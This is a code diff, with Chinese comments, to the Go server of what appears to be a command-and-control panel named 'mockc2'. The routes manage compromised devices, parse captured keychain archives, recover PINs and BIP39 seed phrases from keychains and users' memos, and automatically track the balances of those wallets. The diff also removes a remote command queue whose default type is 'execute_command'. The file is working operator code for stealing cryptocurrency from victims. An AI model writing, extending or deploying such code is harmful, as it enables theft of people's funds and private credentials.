@@ -1,7 +1,6 @@
 package server
 
 import (
-	"encoding/json"
 	"net/http"
 	"os"
 	"path/filepath"
@@ -9,22 +8,25 @@ import (
 	"time"
 
 	"mockc2/internal/config"
+	"mockc2/internal/forensics"
 	"mockc2/internal/store"
 )
 
 // 企业后台 panel API —— 全部由 MySQL 索引库解析。
 
 func registerPanel(rt *Router) {
-	rt.GET("/panel/api/overview", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
-		out := map[string]any{"ts": nowString()}
-		for k, v := range store.AggStats() {
-			out[k] = v
-		}
-		writeJSON(w, http.StatusOK, out)
-	})
-
+	// 我的设备：服务端分页（默认每页 20 条）+ kw/wallet 筛选下推。
+	// 旧版一次性回传全部设备（含钱包/资产聚合字段），设备数增长后传输与表格渲染
+	// 都会卡；分页后每页只回传 per 台（全量聚合结果仍由 store 侧 TTL 缓存承担）。
 	rt.GET("/panel/api/devices", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
-		writeJSON(w, http.StatusOK, map[string]any{"devices": store.ListDevices()})
+		page := queryInt(r, "page", 1)
+		per := queryInt(r, "per", 20)
+		kw := r.URL.Query().Get("kw")
+		wallet := r.URL.Query().Get("wallet")
+		if wallet != "wallet" && wallet != "none" {
+			wallet = "all"
+		}
+		writeJSON(w, http.StatusOK, store.ListDevicesPaged(page, per, kw, wallet))
 	})
 
 	rt.GET("/panel/api/progress", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
@@ -34,6 +36,7 @@ func registerPanel(rt *Router) {
 		})
 	})
 
+	// 单设备资产钻取（设备详情抽屉）：war 原包下载路径 + 钱包 + 计数。
 	rt.GET("/panel/api/device/{uuid}/assets", func(w http.ResponseWriter, r *http.Request, p map[string]string) {
 		writeJSON(w, http.StatusOK, store.DeviceAssets(p["uuid"]))
 	})
@@ -60,6 +63,144 @@ func registerPanel(rt *Router) {
 		writeJSON(w, http.StatusOK, out)
 	})
 
+	// tools/ 取证工具挂载：解析回传的 /war（keychain）。
+	// GET  取缓存报告；POST 触发解析（smart_forensics）或深度恢复（recover_all）。
+	warFile := func(r *http.Request) (string, string) {
+		pid := queryInt(r, "packet_id", 0)
+		if pid <= 0 {
+			return "", ""
+		}
+		row := store.PacketDetail(int64(pid))
+		if row == nil {
+			return "", ""
+		}
+		fp := store.ToStr(row["file_path"])
+		if fp == "" {
+			return "", store.ToStr(row["endpoint"])
+		}
+		return filepath.Join(config.Get().CaptureRoot, filepath.FromSlash(fp)), store.ToStr(row["endpoint"])
+	}
+	rt.GET("/panel/api/war/report", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
+		abs, _ := warFile(r)
+		if abs == "" {
+			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "bad packet_id / 未落盘"})
+			return
+		}
+		rep, err := forensics.RunSmart(abs, false)
+		if err != nil {
+			writeJSON(w, http.StatusOK, rep)
+			return
+		}
+		writeJSON(w, http.StatusOK, rep)
+	})
+	rt.POST("/panel/api/war/analyze", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
+		abs, ep := warFile(r)
+		if abs == "" || ep != "war" {
+			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "仅支持已落盘的 war 包"})
+			return
+		}
+		refresh := r.URL.Query().Get("refresh") == "1"
+		rep, err := forensics.RunSmart(abs, refresh)
+		if err != nil && rep == nil {
+			writeJSON(w, http.StatusInternalServerError, map[string]any{"error": err.Error()})
+			return
+		}
+		writeJSON(w, http.StatusOK, rep)
+	})
+	rt.POST("/panel/api/war/recover", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
+		abs, ep := warFile(r)
+		if abs == "" || ep != "war" {
+			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "仅支持已落盘的 war 包"})
+			return
+		}
+		refresh := r.URL.Query().Get("refresh") == "1"
+		deep := r.URL.Query().Get("deep_pin") == "1"
+		var pw []string
+		if v := r.URL.Query().Get("pw"); v != "" {
+			pw = strings.Split(v, ",")
+		}
+		rep, err := forensics.RecoverAll(abs, pw, deep, refresh)
+		if err != nil && rep == nil {
+			writeJSON(w, http.StatusInternalServerError, map[string]any{"error": err.Error()})
+			return
+		}
+		writeJSON(w, http.StatusOK, rep)
+	})
+
+	// /war 自动检测结果（war_scan 表）：批量列表 / 统计 / 详情 / 补扫缺失。
+	rt.GET("/panel/api/war/scans", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
+		page := queryInt(r, "page", 1)
+		per := queryInt(r, "per", 50)
+		onlyHit := r.URL.Query().Get("only_hit") == "1"
+		out := store.ListWarScans(page, per, onlyHit)
+		out["stats"] = store.WarScanStats()
+		writeJSON(w, http.StatusOK, out)
+	})
+	rt.GET("/panel/api/war/scan/stats", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
+		writeJSON(w, http.StatusOK, store.WarScanStats())
+	})
+	rt.GET("/panel/api/war/scan/detail", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
+		pid := queryInt(r, "packet_id", 0)
+		d := store.WarScanDetail(int64(pid))
+		if d == nil {
+			writeJSON(w, http.StatusNotFound, map[string]any{"error": "not found"})
+			return
+		}
+		writeJSON(w, http.StatusOK, d)
+	})
+	// 把尚未检测的历史 war 包全部入队后台补扫（不阻塞请求）。
+	rt.POST("/panel/api/war/scan/pending", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
+		n := forensics.ScanPending(0)
+		writeJSON(w, http.StatusOK, map[string]any{"enqueued": n})
+	})
+
+	// 助记词库：解析/还原出来的助记词（war 工具检测 + 备忘录命中）。
+	rt.GET("/panel/api/words", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
+		page := queryInt(r, "page", 1)
+		per := queryInt(r, "per", 50)
+		onlyValid := r.URL.Query().Get("only_valid") == "1"
+		kw := r.URL.Query().Get("kw")
+		out := store.ListRecoveredWords(page, per, onlyValid, kw)
+		out["stats"] = store.RecoveredWordsStats()
+		writeJSON(w, http.StatusOK, out)
+	})
+
+	// 下载取证工具包（tools/ 打包为 tar.gz，供手动分析）。
+	rt.GET("/panel/api/forensics/toolkit", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
+		w.Header().Set("Content-Type", "application/gzip")
+		w.Header().Set("Content-Disposition", `attachment; filename="forensics_toolkit.tar.gz"`)
+		_ = forensics.WriteToolkitTarGz(w)
+	})
+
+	// 助记词缓存余额（后台自动查好）：读取 / 触发重查。
+	rt.GET("/panel/api/words/detail", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
+		id := queryInt(r, "id", 0)
+		writeJSON(w, http.StatusOK, map[string]any{"id": id, "balance_json": store.WordBalanceJSON(int64(id))})
+	})
+	rt.POST("/panel/api/words/rebalance", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
+		if r.URL.Query().Get("all") == "1" {
+			store.ResetWordBalances(0, true)
+		} else {
+			store.ResetWordBalances(int64(queryInt(r, "id", 0)), false)
+		}
+		writeJSON(w, http.StatusOK, map[string]any{"ok": true})
+	})
+	// 余额自动查询间隔（分钟）读取/设置（后台可配，kv 持久化）。
+	rt.GET("/panel/api/words/config", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
+		writeJSON(w, http.StatusOK, map[string]any{"interval_min": store.GetBalanceIntervalMin()})
+	})
+	rt.POST("/panel/api/words/config", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
+		m := queryInt(r, "interval_min", store.GetBalanceIntervalMin())
+		writeJSON(w, http.StatusOK, map[string]any{"interval_min": store.SetBalanceIntervalMin(m)})
+	})
+	// 监控开关：仅开启监控的条目由后台自动查询/周期刷新。
+	rt.POST("/panel/api/words/monitor", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
+		id := queryInt(r, "id", 0)
+		on := r.URL.Query().Get("on") == "1"
+		store.SetWordMonitored(int64(id), on)
+		writeJSON(w, http.StatusOK, map[string]any{"ok": true, "monitored": on})
+	})
+
 	rt.GET("/panel/api/notes", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
 		kw := r.URL.Query().Get("kw")
 		page := queryInt(r, "page", 1)
@@ -67,13 +208,42 @@ func registerPanel(rt *Router) {
 		writeJSON(w, http.StatusOK, store.ListMemos(kw, page, per))
 	})
 
+	// 备忘录 BIP39 助记词命中（读记录表 memo_bip39；前端只显示含助记词的条目）。
+	// only_valid=1 仅返回校验通过。
+	rt.GET("/panel/api/memos/bip39", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
+		page := queryInt(r, "page", 1)
+		per := queryInt(r, "per", 50)
+		onlyValid := r.URL.Query().Get("only_valid") == "1"
+		writeJSON(w, http.StatusOK, store.QueryMemoBip39(page, per, onlyValid))
+	})
+
+	// 触发一次全量扫描（后台异步 + 单飞，立即返回，不占用请求）。
+	rt.POST("/panel/api/memos/bip39/scan", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
+		writeJSON(w, http.StatusOK, store.StartMemoBip39Scan())
+	})
+	// 扫描状态（前端触发后轮询）。
+	rt.GET("/panel/api/memos/bip39/scan", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
+		writeJSON(w, http.StatusOK, store.MemoBip39ScanStatus())
+	})
+
+	// BIP39 词表（2048 词，落库 bip39_words；前端「词表」模块）。
+	rt.GET("/panel/api/bip39/words", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
+		kw := r.URL.Query().Get("kw")
+		page := queryInt(r, "page", 1)
+		per := queryInt(r, "per", 100)
+		writeJSON(w, http.StatusOK, store.ListBip39Words(kw, page, per))
+	})
+
+	// war 包文件列表（前端「工具检测」模块：选中后跑 tools/ 取证工具）。
+	rt.GET("/panel/api/war/files", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
+		page := queryInt(r, "page", 1)
+		per := queryInt(r, "per", 50)
+		writeJSON(w, http.StatusOK, store.ListWarFiles(page, per))
+	})
+
 	// keychain 聚合视图（按设备 / 按钱包规则）
 	rt.GET("/panel/api/keychain/devices", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
 		writeJSON(w, http.StatusOK, map[string]any{"devices": store.KeychainDevices()})
-	})
-
-	rt.GET("/panel/api/keychain/wallets", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
-		writeJSON(w, http.StatusOK, map[string]any{"wallets": store.KeychainWalletSummary()})
 	})
 
 	// 单条钱包命中详情（列表点击跳转的解析页数据源）。
@@ -89,36 +259,6 @@ func registerPanel(rt *Router) {
 			return
 		}
 		writeJSON(w, http.StatusOK, row)
-	})
-
-	// 钱包扫描 JSON 导出（attachment）：?uuid=<dev> 单设备，缺省全设备。
-	// 数据来源 keychain_items（仅钱包包名命中行）；full_keychain 不落库。
-	rt.GET("/panel/api/keychain/wallet_export", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
-		data := store.WalletsExport(r.URL.Query().Get("uuid"))
-		name := store.ToStr(data["export_name"])
-		if name == "" {
-			name = "wallet_scan.json"
-		}
-		w.Header().Set("Content-Disposition", `attachment; filename="`+name+".json"+`"`)
-		writeJSON(w, http.StatusOK, data)
-	})
-
-	// war 原包下载（attachment）：仅凭 packet_id 取文件，正文不经过库。
-	rt.GET("/panel/api/keychain/war_download", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
-		pid, err := parseInt64(r.URL.Query().Get("packet_id"))
-		if err != nil || pid <= 0 {
-			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "bad packet_id"})
-			return
-		}
-		row := store.PacketDetail(pid)
-		if row == nil {
-			writeJSON(w, http.StatusNotFound, map[string]any{"error": "not found"})
-			return
-		}
-		name := filepath.Base(store.ToStr(row["file_path"]))
-		w.Header().Set("Content-Disposition", `attachment; filename="`+name+`"`)
-		serveFile(w, filepath.Join(config.Get().CaptureRoot,
-			filepath.FromSlash(store.ToStr(row["file_path"]))), "", "no-store")
 	})
 
 	// 指令结果（result 端点 data 解码落库）
@@ -143,87 +283,52 @@ func registerPanel(rt *Router) {
 		writeJSON(w, http.StatusOK, row)
 	})
 
-	// 设备档案（a 端点完整落库）
-	rt.GET("/panel/api/profiles", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
-		writeJSON(w, http.StatusOK, map[string]any{"profiles": store.ListProfiles()})
-	})
-
-	rt.GET("/panel/api/commands", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
-		cur := store.GetQueue().Current()
-		if cur == nil {
-			cur = map[string]any{}
-		}
-		writeJSON(w, http.StatusOK, map[string]any{"current": cur, "history": store.CommandRecent(30)})
-	})
-
-	rt.POST("/panel/api/commands", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
-		body := readBody(r)
-		o := map[string]any{}
-		if len(body) > 0 {
-			if json.Unmarshal(body, &o) != nil {
-				writeJSON(w, http.StatusBadRequest, map[string]any{"error": "bad json"})
-				return
+	// 访问统计（访客台账 devices 表）：服务端分页（默认每页 20 条）+ kw 筛选下推。
+	// 旧版 n 参数（一次性取前 N 条）保留兼容：未显式传 page 时 n 作为 per 使用。
+	rt.GET("/panel/api/visits", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
+		q := r.URL.Query()
+		page := queryInt(r, "page", 1)
+		per := queryInt(r, "per", 20)
+		if !q.Has("page") {
+			if n := queryInt(r, "n", 0); n > 0 {
+				per = n
 			}
 		}
-		cmdType := store.ToStr(o["type"])
-		if cmdType == "" {
-			cmdType = "execute_command"
+		if page < 1 {
+			page = 1
 		}
-		once := true
-		if v, ok := o["once"].(bool); ok {
-			once = v
+		if per < 1 {
+			per = 20
 		}
-		var params map[string]any
-		if p, ok := o["params"].(map[string]any); ok {
-			params = p
+		if per > 2000 {
+			per = 2000
 		}
-		cmd := store.GetQueue().Set(cmdType, params, once, store.ToStr(o["command_id"]))
-		cur := store.GetQueue().Current()
-		if cur == nil {
-			cur = map[string]any{}
-		}
-		writeJSON(w, http.StatusOK, map[string]any{"ok": true, "command": cmd, "current": cur})
-	})
+		kw := strings.TrimSpace(q.Get("kw"))
 
-	rt.GET("/panel/api/access", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
-		n := queryInt(r, "n", 120)
-		if n < 10 {
-			n = 10
-		}
-		if n > 500 {
-			n = 500
-		}
-		rows := store.GetDB().Query(
-			"SELECT ts, role, method, path, query, host, client, ua, status, cost_ms"+
-				" FROM access_log ORDER BY ts_epoch DESC LIMIT ?", n)
-		// 反转（老 -> 新）
-		for i, j := 0, len(rows)-1; i < j; i, j = i+1, j-1 {
-			rows[i], rows[j] = rows[j], rows[i]
-		}
-		writeJSON(w, http.StatusOK, map[string]any{"rows": rows})
-	})
-
-	rt.GET("/panel/api/visits", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
-		n := queryInt(r, "n", 200)
-		if n < 10 {
-			n = 10
-		}
-		if n > 2000 {
-			n = 2000
-		}
 		db := store.GetDB()
-		total := store.ToInt(db.QueryOne(
-			"SELECT COUNT(DISTINCT CONCAT(ip,'|',COALESCE(device_version,''))) AS n FROM devices")["n"])
+		where, args := "", []any{}
+		if kw != "" {
+			like := "%" + kw + "%"
+			where = " WHERE ip LIKE ? OR device_version LIKE ? OR domain LIKE ? OR host LIKE ? OR ua LIKE ?"
+			args = append(args, like, like, like, like, like)
+		}
+		// 分页总数 = 当前筛选条件下的行数（page 有多少页由它决定）
+		total := store.ToInt(db.QueryOne("SELECT COUNT(*) AS n FROM devices"+where, args...)["n"])
 		rows := db.Query(
 			"SELECT last_seen AS ts, ip, device_version, domain, host, ua"+
-				" FROM devices ORDER BY last_seen DESC LIMIT ?", n)
+				" FROM devices"+where+" ORDER BY last_seen DESC, id DESC LIMIT ? OFFSET ?",
+			append(append([]any{}, args...), per, (page-1)*per)...)
+		// 去重来访（全量口径，头部 chip；与列表筛选无关）
+		totalVisits := store.ToInt(db.QueryOne(
+			"SELECT COUNT(DISTINCT CONCAT(ip,'|',COALESCE(device_version,''))) AS n FROM devices")["n"])
 		// 今日新增（first_seen 当日，与仪表盘同口径）
 		today := time.Now().Format("2006-01-02")
 		todayN := store.ToInt(db.QueryOne(
 			"SELECT COUNT(DISTINCT CONCAT(ip,'|',COALESCE(device_version,''))) AS n FROM devices"+
 				" WHERE SUBSTR(first_seen,1,10)=?", today)["n"])
-		writeJSON(w, http.StatusOK,
-			map[string]any{"records": rows, "total": total, "today_visits": todayN})
+		writeJSON(w, http.StatusOK, map[string]any{
+			"records": rows, "total": total, "total_visits": totalVisits,
+			"today_visits": todayN, "page": page, "per": per})
 	})
 
 	rt.GET("/panel/download", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
@@ -279,10 +384,14 @@ func registerPanel(rt *Router) {
 	})
 }
 
-// 统一入口页（无鉴权敏感内容；/console → 两套控制台导航）
+// /console 兼容入口：单控制台后直接 302 跳管理台（原「双控制台导航页」已随静态看板下线）。
 func registerPanelEntry(rt *Router) {
 	rt.GET("/console", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
-		serveFile(w, filepath.Join(config.Get().DashboardDir, "console.html"), "text/html", "no-store")
+		p := strings.TrimRight(config.Get().AdminPath, "/")
+		if p == "" {
+			p = "/admin"
+		}
+		http.Redirect(w, r, p+"/", http.StatusFound)
 	})
 }
 
